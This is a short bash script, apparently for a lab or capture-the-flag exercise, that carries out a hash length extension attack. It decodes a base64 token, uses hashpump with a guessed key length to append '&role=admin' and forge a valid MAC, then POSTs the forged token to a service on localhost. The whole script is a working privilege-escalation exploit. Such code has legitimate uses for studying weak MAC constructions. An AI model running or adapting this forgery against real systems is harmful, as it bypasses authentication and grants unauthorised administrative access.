#!/usr/bin/env bash
# Usage: ./attacker_forge.sh <token_b64> <key_len_guess>

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <token_b64> <key_len_guess>"
    exit 1
fi

TOKEN=$1
KEYLEN=$2

# decode token to get data and mac
RAW=$(echo -n "$TOKEN" | base64 -d)

# separate data and mac
# Assuming format data.mac where data does not contain dots
DATA=$(echo -n "$RAW" | awk -F'.' '{print $1}')
MAC=$(echo -n "$RAW" | awk -F'.' '{print $2}')

echo "Original data: $DATA"
echo "Original MAC:  $MAC"

# extension we want to add
EXT="&role=admin"

# use hashpump to create forged mac and new message
# Note: hashpump outputs the signature on line 1 and the new data on line 2 (escaped or raw depending on version)
hashpump -s $MAC -d "$DATA" -a "$EXT" -k $KEYLEN > /tmp/hashpump_out.txt

NEWHASH=$(awk 'NR==1{print $0}' /tmp/hashpump_out.txt) # new hash hex
NEWDATA=$(awk 'NR==2{print $0}' /tmp/hashpump_out.txt) # new message with padding

echo "New MAC: $NEWHASH"
echo "New data (with padding): $NEWDATA"

# build new token (base64 of newdata + "." + newmac)
# IMPORTANT: This assumes hashpump output can be safely passed to base64 via printf.
NEWTOKEN=$(printf "%s.%s" "$NEWDATA" "$NEWHASH" | base64 -w0)

echo "Forged token (b64): $NEWTOKEN"

# Attempt to access resource
curl -s -X POST http://127.0.0.1:5000/resource \
     -H "Content-Type: application/json" \
     -d "{\"token\":\"$NEWTOKEN\"}" | jq .
